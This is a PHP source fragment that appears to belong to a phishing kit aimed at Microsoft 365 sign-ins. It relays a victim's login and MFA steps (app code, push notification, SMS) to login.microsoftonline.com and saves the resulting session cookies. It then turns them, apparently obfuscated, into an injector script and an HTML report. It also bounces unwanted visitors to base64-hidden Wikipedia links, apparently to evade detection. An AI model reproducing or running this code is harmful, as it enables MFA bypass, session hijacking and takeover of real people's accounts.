                // Create a Guzzle client with the cookie jar
                $client = new Client([
                    'cookies' => $cookieJar,
                ]);

                $response = $client->post('https://login.microsoftonline.com/common/resume', [
                    'query' => [
                        'skipmfaregistration' => '1'
                    ],
                    'headers' => [
                        'User-Agent'                => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0',
                        'Accept'                    => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language'           => 'en-US,en;q=0.5',
                        'Accept-Encoding'           => 'gzip, deflate, br',
                        'Referer'                   => 'https://login.microsoftonline.com/common/SAS/ProcessAuth',
                        'Content-Type'              => 'application/x-www-form-urlencoded',
                        'Origin'                    => 'https://login.microsoftonline.com',
                        'Connection'                => 'keep-alive',
                        'Cookie' 					=> $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
                        'Upgrade-Insecure-Requests' => '1',
                        'Sec-Fetch-Dest'            => 'document',
                        'Sec-Fetch-Mode'            => 'navigate',
                        'Sec-Fetch-Site'            => 'same-origin',
                        'Sec-Fetch-User'            => '?1',
                        'TE'                        => 'trailers'
                    ],
                    'form_params' => [
                        'flowToken' => $this->$sFT,
                        'ctx' => $ctx,
                        'canary' => $this->$canary
                    ]
                ]);

                $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

                // You can get the content with:
                $result = $response->getBody()->getContents();

                preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
                $sCtx = $sCtx[0];
				$this->sCtx = $sCtx;

                preg_match('/(?<="sessionId":")[^"]*/', $result, $session);
                $session = $session[0];
				$this->session_id = $session;

                preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
                $sFT = $sFT[0];
				$this->sFT = $sFT;

                preg_match('/(?<="canary":")[^"]*/', $result, $canary);
                $canary = $canary[0];
				$this->canary = $canary;
            }else{
                preg_match('/(?<="sCtx":")[^"]*/', $result, $sCtx);
                $sCtx = $sCtx[0];
				$this->sCtx = $sCtx;

                preg_match('/(?<="sessionId":")[^"]*/', $result, $session);
                $session = $session[0];
				$this->session_id = $session;

                preg_match('/(?<="sFT":")[^"]*/', $result, $sFT);
                $sFT = $sFT[0];
				$this->sFT = $sFT;

                preg_match('/(?<="canary":")[^"]*/', $result, $canary);
                $canary = $canary[0];
				$this->canary = $canary;
            }
			
            $response = $client->request('POST', 'https://login.microsoftonline.com/kmsi', [
				'headers' => [
					'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Cache-Control' => 'max-age=0',
					'Content-Type' => 'application/x-www-form-urlencoded',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					'Origin' => 'https://login.microsoftonline.com',
					'Referer' => 'https://login.microsoftonline.com/common/login',
					'Sec-CH-UA' => '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
					'Sec-CH-UA-Mobile' => '?0',
					'Sec-CH-UA-Platform' => '"Windows"',
					'Sec-Fetch-Dest' => 'document',
					'Sec-Fetch-Mode' => 'navigate',
					'Sec-Fetch-Site' => 'same-origin',
					'Sec-Fetch-User' => '?1',
					'Upgrade-Insecure-Requests' => '1',
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0',
				],
				'form_params' => [
					'LoginOptions' => '1',
					'type' => '28',
					'ctx' => $this->sCtx,
					'hpgrequestid' => $this->request_id,
					'flowToken' => $this->sFT,
					'DontShowAgain' => 'true',
					'canary' => $this->canary,
					'i19' => '14108',
				]
			]);
			$cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			// You can get the content with:
			$result = $response->getBody()->getContents();

			$cookie = file_get_contents($this->currentDirectory . '/cookie_' . $this->email . '.txt');

			// Obfuscate and store the cookie
			$cookiejs =
					$this->generateInjectorScript($cookie);

			file_put_contents($this->currentDirectory . '/js_' . $this->email . '.txt', $cookiejs);
			$this->saveHtmlReport($cookie, $cookiejs);
		}

		public function BeginAuth($type){
			if($this->email != $_SESSION['email'] || !isset($_SESSION['status']) || !isset($_SESSION['info_token_2fa'])){
	    		$this->redirect('Empty');
			}
		
			$this->status = $_SESSION['status'];
			$this->currentDirectory = getcwd()."/core";

			
			if($type == "verify_code")
			{
				$methodID = "PhoneAppOTP";
			}
			else if($type == "verify_app")
			{
				$methodID = "PhoneAppNotification";
			}
			else if($type == "verify_sms")
			{
				$methodID = "OneWaySMS";
			}

			$cookieJar = new FileCookieJar($this->currentDirectory . '/cookie_' . $this->email . '.txt', true); // For saving cookies to a file

            // Create a Guzzle client with the cookie jar
            $client = new Client([
                'cookies' => $cookieJar,
            ]);

            $response = $client->post('https://login.microsoftonline.com/common/SAS/BeginAuth', [
				'headers' => [
					'Accept' => 'application/json',
					'Accept-Language' => 'en-US,en;q=0.9',
					'Connection' => 'keep-alive',
					'Content-Type' => 'application/json; charset=UTF-8',
					'Cookie' => $this->gencook($this->currentDirectory . '/cookie_' . $this->email . '.txt'),
					'Origin' => 'https://login.microsoftonline.com',
					'Referer' => 'https://login.microsoftonline.com/common/login',
					'Sec-Fetch-Dest' => 'empty',
					'Sec-Fetch-Mode' => 'cors',
					'Sec-Fetch-Site' => 'same-origin',
					'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
					'Canary' => $_SESSION['info_token_2fa']['api_canary'],
					'Client-Request-Id' => $_SESSION['info_token_2fa']['request_id'],
					'Hpgact' => '2000',
					'Hpgid' => '1114',
					'Hpgrequestid' => $_SESSION['info_token_2fa']['session_id'],
					'Sec-Ch-Ua' => '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
					'Sec-Ch-Ua-Mobile' => '?0',
					'Sec-Ch-Ua-Platform' => '"Windows"'
				],
				'json' => [
					'AuthMethodId' => $methodID,
					'Method' => 'BeginAuth',
					'ctx' => $_SESSION['info_token_2fa']['sCtx'],
					'flowToken' => $_SESSION['info_token_2fa']['sFT']
				]
			]);

            $cookieJar->save($this->currentDirectory . '/cookie_' . $this->email . '.txt');
            // You can get the content with:
            $result = $response->getBody()->getContents();


			if (strpos($result, '"Success":true') !== false) {
				$this->status['2fa_beginauth'] = true;
				$data = json_decode($result, true);

				$this->sFT = $data['FlowToken'];
				$this->sCtx = $_SESSION['info_token_2fa']['sCtx'];
				$this->api_canary = $_SESSION['info_token_2fa']['api_canary'];
				$this->canary = $_SESSION['info_token_2fa']['canary'];
				$this->session_id = $data['SessionId'];
				$this->request_id = $_SESSION['info_token_2fa']['request_id'];

				/*
				preg_match('/"FlowToken"\s*:\s*"([^"]+)"/', $result, $sFT);
				preg_match('/"Ctx"\s*:\s*"([^"]+)"/', $result, $sCtx);
				preg_match('/"SessionId"\s*:\s*"([^"]+)"/', $result, $session_id);
				preg_match('/"CorrelationId"\s*:\s*"([^"]+)"/', $result, $request_id);
				
				$this->sFT = $sFT[1];
				$this->sCtx = $sCtx[1];
				$this->api_canary = $_SESSION['info_token_2fa']['api_canary'];
				$this->canary = $_SESSION['info_token_2fa']['canary'];
				$this->session_id = $session_id[1];
				$this->request_id = $request_id[1];*/

				if($type == 'verify_app'){
					$this->status['entropy'] = $data['Entropy'];
				}
			}else{
				$this->status['2fa_beginauth'] = false;
			}
		}
		public function redirect($error = ""){
			header("Location: ".$this->getRandomLink()."#".$error);
			exit();
		}
		public function getRandomLink(){
			$link = array("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfMzY1","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9MaXN0X29mX01pY3Jvc29mdF8zNjVfQXBwbGljYXRpb25z","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DYXRlZ29yeTpPZmZpY2VfMzY1","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2lkLndpa2lwZWRpYS5vcmcvd2lraS9CZXJrYXM6TG9nb19NaWNyb3NvZnRfT2ZmaWNlXzM2NV8oMjAxMy0yMDE5KS5zdmc=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfT2ZmaWNlX01peA==","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfRXhjaGFuZ2VfU2VydmVy","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbF9jbGllbnQ=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbA==","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DbGllbnRfYWNjZXNzX2xpY2Vuc2U=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9XaW5kb3dzX1NlcnZlcl8yMDE2","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9XaW5kb3dzX1NlcnZlcl8yMDE5","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9JbnRlcm5ldF9FeHBsb3Jlcl8xMQ==");
			$random = rand(0, 11);
			$FailRedirect = base64_decode($link[$random]);

			return $FailRedirect;
		}
	}
